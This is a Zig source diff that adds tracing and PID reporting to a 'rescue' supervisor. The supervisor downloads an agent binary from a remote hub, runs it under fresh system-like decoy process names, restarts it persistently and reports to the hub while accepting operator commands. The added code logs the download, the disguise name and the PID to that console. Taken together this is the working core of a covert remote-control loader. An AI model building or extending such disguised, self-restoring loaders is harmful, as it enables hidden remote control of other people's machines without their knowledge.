@@ -104,6 +104,7 @@ const Status = struct {
     restarts: u32 = 0, // how many times the agent has been (re)started
     last_exit: i64 = -1, // last agent exit code (-1 = none yet)
     last_uptime_ms: u64 = 0, // how long the agent ran last time
+    agent_pid: i64 = -1, // pid of the currently-supervised agent (-1 = none)
     detail_buf: [192]u8 = undefined,
     detail_len: usize = 0, // free-text detail (last log-worthy event)
 
@@ -133,6 +134,52 @@ const Status = struct {
 
 // Global status the reporter thread reads. Lives for the process lifetime.
 var g_status: Status = .{};
+
+// ---- trace ring (rescue activity log, surfaced in the console) ------------
+// A small fixed ring of timestamped one-line events describing what the rescue
+// is doing — most importantly the agent startup sequence (download, disguise,
+// spawn+pid, exit). Reported in full on every cycle so the console can show a
+// live timeline without a separate endpoint. Bounded + lock-guarded; oldest
+// entries are overwritten. Kept compact to stay within the report body buffer.
+const trace_cap = 12;
+const trace_msg_max = 96;
+const TraceEntry = struct {
+    secs: i64 = 0, // wall-clock unix seconds (0 = unused slot)
+    buf: [trace_msg_max]u8 = undefined,
+    len: usize = 0,
+    fn msg(self: *const TraceEntry) []const u8 {
+        return self.buf[0..self.len];
+    }
+};
+const Trace = struct {
+    mu: Io.Mutex = .init,
+    ring: [trace_cap]TraceEntry = [_]TraceEntry{.{}} ** trace_cap,
+    next: usize = 0, // write cursor
+    total: u64 = 0, // monotonic count (for ordering / "n events")
+    fn add(self: *Trace, io: Io, comptime fmt: []const u8, args: anytype) void {
+        self.mu.lockUncancelable(io);
+        defer self.mu.unlock(io);
+        const e = &self.ring[self.next];
+        e.secs = Io.Timestamp.now(io, .real).toSeconds();
+        const w = std.fmt.bufPrint(&e.buf, fmt, args) catch blk: {
+            // truncate on overflow rather than drop
+            const n = @min(fmt.len, trace_msg_max);
+            @memcpy(e.buf[0..n], fmt[0..n]);
+            break :blk e.buf[0..n];
+        };
+        e.len = w.len;
+        self.next = (self.next + 1) % trace_cap;
+        self.total += 1;
+    }
+};
+var g_trace: Trace = .{};
+
+// traceLine records a trace event AND mirrors it to the normal log, so a single
+// call covers both the operator timeline and local/file logging.
+fn traceLine(io: Io, comptime fmt: []const u8, args: anytype) void {
+    g_trace.add(io, fmt, args);
+    logLine(fmt, args);
+}
 
 // ---- operator commands (hub -> rescue, HTTPS long-poll) -------------------
 // The rescue speaks HTTPS only (no WebSocket): it POSTs a report every ~30s and
@@ -579,6 +626,7 @@ fn postReport(gpa: std.mem.Allocator, io: Io, cfg: Config, fingerprint: []const 
     const restarts = g_status.restarts;
     const last_exit = g_status.last_exit;
     const last_uptime_ms = g_status.last_uptime_ms;
+    const agent_pid = g_status.agent_pid;
     var detail_raw_buf: [192]u8 = undefined;
     const detail_raw = blk: {
         const d = g_status.detail();
@@ -590,6 +638,14 @@ fn postReport(gpa: std.mem.Allocator, io: Io, cfg: Config, fingerprint: []const 
     var detail_buf: [384]u8 = undefined;
     const detail = jsonEscape(&detail_buf, detail_raw);
 
+    // Rescue work dir (where it downloads/stages the agent + decoys).
+    var cwd_buf: [768]u8 = undefined;
+    const cwd_esc = jsonEscape(&cwd_buf, cfg.data_dir);
+
+    // Render the trace ring as a JSON array (oldest -> newest).
+    var trace_buf: [1536]u8 = undefined;
+    const trace_json = buildTraceJson(&trace_buf, io);
+
     // Drain any pending command results to report back to the hub.
     var results: [result_cap]CmdResult = undefined;
     g_cmds.lock(io);
@@ -599,10 +655,10 @@ fn postReport(gpa: std.mem.Allocator, io: Io, cfg: Config, fingerprint: []const 
     var results_buf: [1024]u8 = undefined;
     const results_json = buildResultsJson(&results_buf, results[0..rn]);
 
-    var body_buf: [2048]u8 = undefined;
+    var body_buf: [4096]u8 = undefined;
     const body = try std.fmt.bufPrint(&body_buf,
-        \\{{"key":"{s}","fingerprint":"{s}","version":"{s}","os":"{s}","arch":"{s}","status":"{s}","detail":"{s}","restarts":{d},"lastExit":{d},"lastUptimeMs":{d},"results":{s}}}
-    , .{ cfg.key, fingerprint, rescue_version, os_name, arch_name, phase.label(), detail, restarts, last_exit, last_uptime_ms, results_json });
+        \\{{"key":"{s}","fingerprint":"{s}","version":"{s}","os":"{s}","arch":"{s}","status":"{s}","detail":"{s}","cwd":"{s}","agentPid":{d},"restarts":{d},"lastExit":{d},"lastUptimeMs":{d},"trace":{s},"results":{s}}}
+    , .{ cfg.key, fingerprint, rescue_version, os_name, arch_name, phase.label(), detail, cwd_esc, agent_pid, restarts, last_exit, last_uptime_ms, trace_json, results_json });
 
     var client: std.http.Client = .{ .allocator = gpa, .io = io };
     defer client.deinit();
@@ -624,6 +680,31 @@ fn postReport(gpa: std.mem.Allocator, io: Io, cfg: Config, fingerprint: []const 
     }
     const resp = rw.buffered();
     scanCommands(io, resp);
+}
+
+// buildTraceJson renders the trace ring as a JSON array oldest->newest. Each
+// entry: {"t":<unix-secs>,"m":"<msg>"}. Empty -> "[]".
+fn buildTraceJson(buf: []u8, io: Io) []const u8 {
+    g_trace.mu.lockUncancelable(io);
+    defer g_trace.mu.unlock(io);
+    var w = std.Io.Writer.fixed(buf);
+    w.writeAll("[") catch return "[]";
+    var count: usize = 0;
+    var i: usize = 0;
+    // Walk in chronological order starting from the oldest slot.
+    const start = if (g_trace.total >= trace_cap) g_trace.next else 0;
+    while (i < trace_cap) : (i += 1) {
+        const idx = (start + i) % trace_cap;
+        const e = &g_trace.ring[idx];
+        if (e.len == 0 and e.secs == 0) continue;
+        var m_buf: [trace_msg_max * 2]u8 = undefined;
+        const m = jsonEscape(&m_buf, e.msg());
+        const sep_s: []const u8 = if (count == 0) "" else ",";
+        w.print("{s}{{\"t\":{d},\"m\":\"{s}\"}}", .{ sep_s, e.secs, m }) catch break;
+        count += 1;
+    }
+    w.writeAll("]") catch return "[]";
+    return w.buffered();
 }
 
 // buildResultsJson renders a results array for the report body. Empty -> "[]".
@@ -676,12 +757,12 @@ fn commandWatcher(io: Io) void {
                     g_child_mu.lockUncancelable(io);
                     g_force_update = true;
                     g_child_mu.unlock(io);
-                    logLine("operator command: update-agent ({s})", .{c.id()});
+                    traceLine(io, "operator command: update-agent", .{});
                     killCurrentChild(io);
                     pushCmdResult(io, c.id(), "done", "agent update triggered (re-download + restart)");
                 },
                 .restart_agent => {
-                    logLine("operator command: restart-agent ({s})", .{c.id()});
+                    traceLine(io, "operator command: restart-agent", .{});
                     killCurrentChild(io);
                     pushCmdResult(io, c.id(), "done", "agent restart triggered");
                 },
@@ -764,6 +845,19 @@ fn copyExecutable(gpa: std.mem.Allocator, io: Io, src_path: []const u8, dst_path
     if (builtin.os.tag != .windows) out.setPermissions(io, .fromMode(0o755)) catch {};
 }
 
+// pidFromChild returns the OS pid of a spawned child for display/reporting.
+// On POSIX child.id IS the pid; on Windows it's a process HANDLE, so we ask the
+// kernel for the pid behind it. Returns -1 if unavailable.
+extern "kernel32" fn GetProcessId(Process: *anyopaque) callconv(.winapi) u32;
+fn pidFromChild(child: *const std.process.Child) i64 {
+    const id = child.id orelse return -1;
+    if (builtin.os.tag == .windows) {
+        const p = GetProcessId(id);
+        return if (p == 0) -1 else @intCast(p);
+    }
+    return @intCast(id);
+}
+
 fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8) !void {
     var backoff: u64 = cfg.min_backoff_ms;
     // The decoy binary currently in use (a copy of the agent under a system-like
@@ -786,7 +880,7 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
         g_force_update = false;
         g_child_mu.unlock(io);
         if (force_update) {
-            logLine("forced agent update: removing current binary", .{});
+            traceLine(io, "operator update: re-downloading agent", .{});
             Io.Dir.cwd().deleteFile(io, agent_path) catch {};
             g_status.set(io, .downloading, "updating agent from {s}", .{cfg.hub});
         }
@@ -794,16 +888,19 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
         // RESCUE: re-validate (and re-download) before every (re)start.
         // Mark "downloading" only when the binary is actually absent/invalid so
         // the console shows the bootstrap phase (the common cold-start case).
-        if (!agentLooksValid(io, agent_path)) {
+        const needs_dl = !agentLooksValid(io, agent_path);
+        if (needs_dl) {
             g_status.set(io, .downloading, "fetching agent from {s}", .{cfg.hub});
+            traceLine(io, "downloading agent from {s}", .{cfg.hub});
         }
         ensureAgent(gpa, io, cfg, agent_path) catch |err| {
             g_status.set(io, .error_state, "cannot obtain agent: {s}", .{@errorName(err)});
-            logLine("cannot obtain agent ({s}); retrying in {d}ms", .{ @errorName(err), backoff });
+            traceLine(io, "download failed: {s}; retry in {d}ms", .{ @errorName(err), backoff });
             sleepMs(io, backoff);
             backoff = @min(backoff * 2, cfg.max_backoff_ms);
             continue;
         };
+        if (needs_dl) traceLine(io, "agent ready ({s})", .{rescue_version});
 
         // DISGUISE: launch the agent under a system-like decoy name (a copy of
         // the validated binary), picking a fresh name each launch. The agent's
@@ -813,8 +910,10 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
         const spawn_path = decoy orelse agent_path;
         prev_decoy = decoy;
 
-        g_status.set(io, .starting_agent, "spawning agent", .{});
-        logLine("starting agent as {s} --data-dir {s}", .{ spawn_path, cfg.data_dir });
+        // The decoy file's basename is the disguised process name.
+        const disguise = std.fs.path.basename(spawn_path);
+        g_status.set(io, .starting_agent, "spawning agent as {s}", .{disguise});
+        traceLine(io, "starting agent (disguised as {s})", .{disguise});
 
         const start_ts = Io.Timestamp.now(io, .awake);
 
@@ -825,7 +924,7 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
             .stderr = .inherit,
         }) catch |err| {
             g_status.set(io, .error_state, "spawn failed: {s}", .{@errorName(err)});
-            logLine("spawn failed: {s}", .{@errorName(err)});
+            traceLine(io, "spawn failed: {s}", .{@errorName(err)});
             // corrupt binary? force re-download
             Io.Dir.cwd().deleteFile(io, agent_path) catch {};
             sleepMs(io, backoff);
@@ -833,13 +932,16 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
             continue;
         };
 
-        // Agent is up. Count the (re)start and flip to the supervising phase.
+        // Agent is up. Record its pid, count the (re)start, flip to supervising.
+        const agent_pid = pidFromChild(&child);
         g_status.lock(io);
         g_status.restarts += 1;
         g_status.phase = .supervising;
-        const detail = std.fmt.bufPrint(&g_status.detail_buf, "agent running (pid-tracked)", .{}) catch "";
+        g_status.agent_pid = agent_pid;
+        const detail = std.fmt.bufPrint(&g_status.detail_buf, "agent running (pid {d}, as {s})", .{ agent_pid, disguise }) catch "";
         g_status.detail_len = detail.len;
         g_status.unlock(io);
+        traceLine(io, "agent up: pid {d} as {s}", .{ agent_pid, disguise });
 
         if (cfg.once) {
             logLine("--once: agent spawned, exiting supervisor", .{});
@@ -887,11 +989,12 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
         g_status.last_exit = exit_code;
         g_status.last_uptime_ms = uptime_ms;
         g_status.phase = .restarting;
+        g_status.agent_pid = -1;
         const rd = std.fmt.bufPrint(&g_status.detail_buf, "agent exited ({d}) after {d}ms; restart in {d}ms", .{ exit_code, uptime_ms, backoff }) catch "";
         g_status.detail_len = rd.len;
         g_status.unlock(io);
 
-        logLine("restarting agent in {d}ms", .{backoff});
+        traceLine(io, "agent exited code={d} after {d}ms; restart in {d}ms", .{ exit_code, uptime_ms, backoff });
         sleepMs(io, backoff);
     }
 }
@@ -1034,6 +1137,7 @@ pub fn main(init: std.process.Init) !void {
     };
 
     g_status.set(io, .starting, "rescue online; preparing agent", .{});
+    traceLine(io, "rescue {s} online ({s}/{s}); node n{s}", .{ rescue_version, os_name, arch_name, if (fingerprint.len >= 6) fingerprint[0..6] else "??????" });
 
     // Synchronous initial report so the node appears the instant the rescue
     // starts — before the (potentially slow) first download. Best-effort.
